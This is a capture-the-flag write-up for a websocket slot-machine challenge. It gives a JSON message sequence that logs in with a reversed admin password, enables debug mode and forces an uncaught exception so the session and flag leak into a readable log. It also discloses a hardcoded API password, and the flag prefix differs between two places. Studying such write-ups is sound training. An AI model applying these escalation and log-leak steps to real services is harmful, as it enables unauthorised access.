# Intergalactic bandit
> > Web - 488pts/10 solves
>
> The neighbouring aliens have been enjoying the classical *One Armed Bandit* at the casino.
> However, they can't seem to win anything. Can you show them how?

## Writeup
The challenge can be solved in three different intended ways:

- [Intergalactic bandit](#intergalactic-bandit)
  - [Writeup](#writeup)
    - [Connecting to the websocket](#connecting-to-the-websocket)
    - [The lucky](#the-lucky)
    - [The hacker](#the-hacker)
    - [The loremaster](#the-loremaster)

### Connecting to the websocket

Both [the-hacker](#the-hacker) and [the-loremaster](#the-loremaster) requires the player to connect to the websocket of the server. There are several ways to do this, however [wscat](https://github.com/websockets/wscat) is often recommended. Connecting to a websocket with wscat can be done with the following command:

```bash
wscat -c wss://<ip>:<port>/ws
```

### The lucky

Getting the flag through sheer luck is possible according to the law of big numbers. However, the chances beating the challenge this way is very low. Definetely so within the timeslot of the ctf.

### The hacker

The most likely way to solve the challenge, and utilises the websocket api. The solution requires several steps to be performed in order:

- Reversing the admin password (exercise left to the reader, hint)
- Logging in as admin
- Adding the flag to the session dictionary
- Use the admin api to enable debug mode
- Create an exception that is not catched by the specific handlers. This will add the session dict to the session log, including the flag. Some ways to create exceptions
  - Use the motherload api with a non existing item *password*, since it does not utilize `dict.get()` method.
  - Logout twice, since the logout handler does not check if the user is logged in and `session.pop()` will throw an exception (KeyError), since no default value is provided.
- Access the log through the url.

The sequence will look something like this:

```json
{"type":"info"}
{"type":"login","password":"hunter2"}
{"type":"debug"}
{"type":"flag"}
{"type":"motherload"}
```

This will generate a log similar to this:

```txt
59670de7-c6bc-44a0-affa-71c5f07b1d9f INFO New WS connection from ('129.242.236.89', 44730), assigned session id: 59670de7-c6bc-44a0-affa-71c5f07b1d9f
59670de7-c6bc-44a0-affa-71c5f07b1d9f INFO Admin logged in, welcome back me! addr="('129.242.236.89', 44730)"
59670de7-c6bc-44a0-affa-71c5f07b1d9f DEBUG request: {'type': 'flag'}
59670de7-c6bc-44a0-affa-71c5f07b1d9f DEBUG request: {'type': 'motherload'}
59670de7-c6bc-44a0-affa-71c5f07b1d9f DEBUG User state: session={'id': '59670de7-c6bc-44a0-affa-71c5f07b1d9f', 'addr': "('129.242.236.89', 44730)", 'coins': 200, 'admin': True, 'flag': 'UiTHack24{Passw0rd_1s_*******}'}
59670de7-c6bc-44a0-affa-71c5f07b1d9f ERROR Error from addr="('129.242.236.89', 44730)":
Traceback (most recent call last):
  File "/home/user/Documents/repo/UiTHack24/Web/bandit/src/app.py", line 248, in connect
    if session.get("admin", False) and (msg["password"]):
KeyError: 'password'
```

### The loremaster

This is a easter egg for the truly knowledgable about the early days of the internet. However even then it is not a trivial task to get the flag. By using the very obvious motherload api, the player can get an immense amount of money. This is mainly intended as a timesink, but nevertheless a intended and valid way to get the flag.
However there is and additional password protecting the api, along with the need of admin credentials. In contrast to the admin password which is easily reversed. It is not provided in the source file, and with the addition of beeing hashed with argon2. Which *hopefully* should make it impossible to brute force, [or other unintended ways](https://xkcd.com/538/).
By first reversing the admin password, many will recognise the admin password "hunter2" as a reference to a well known [irc conversation](https://knowyourmeme.com/memes/hunter2).
The password for the motherload api is a reference to the same conversation, and therefore beeing possible but still hard to guess. The password is `AzureDiamondCthon98` and was initially used as a testing feature, but was left/*intentionally forgotten*.

Flag:

```txt
UiTHack23{Passw0rd_1s_*******}
```
